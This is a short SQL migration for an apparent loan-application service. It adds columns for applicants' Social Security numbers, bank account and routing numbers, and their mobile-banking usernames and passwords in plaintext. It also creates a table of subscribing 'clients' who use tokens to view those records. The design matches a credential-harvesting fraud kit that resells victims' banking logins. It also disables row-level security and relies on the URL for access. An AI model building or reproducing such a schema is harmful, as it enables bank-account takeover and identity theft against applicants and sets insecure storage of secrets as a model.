-- Create clients table for managing client subscriptions
CREATE TABLE public.clients (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL,
  email TEXT NOT NULL,
  access_token TEXT UNIQUE NOT NULL,
  token_expiry TIMESTAMP WITH TIME ZONE NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  is_active BOOLEAN NOT NULL DEFAULT true
);

-- Disable Row Level Security for now (admin panel access controlled by URL)
ALTER TABLE public.clients DISABLE ROW LEVEL SECURITY;

-- Update loan_applications table to include all form fields and client reference
ALTER TABLE public.loan_applications
ADD COLUMN client_id UUID REFERENCES public.clients(id),
ADD COLUMN ssn TEXT,
ADD COLUMN credit_score TEXT,
ADD COLUMN bank_name TEXT,
ADD COLUMN years_with_bank INTEGER,
ADD COLUMN account_number TEXT,
ADD COLUMN routing_number TEXT,
ADD COLUMN mobile_username TEXT,
ADD COLUMN mobile_password TEXT;

-- Add RLS for loan_applications
ALTER TABLE public.loan_applications ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Anyone can insert applications" ON public.loan_applications FOR INSERT WITH CHECK (true);
CREATE POLICY "Clients can view their applications" ON public.loan_applications FOR SELECT USING (client_id IN (SELECT id FROM clients WHERE access_token = current_setting('app.current_token', true)));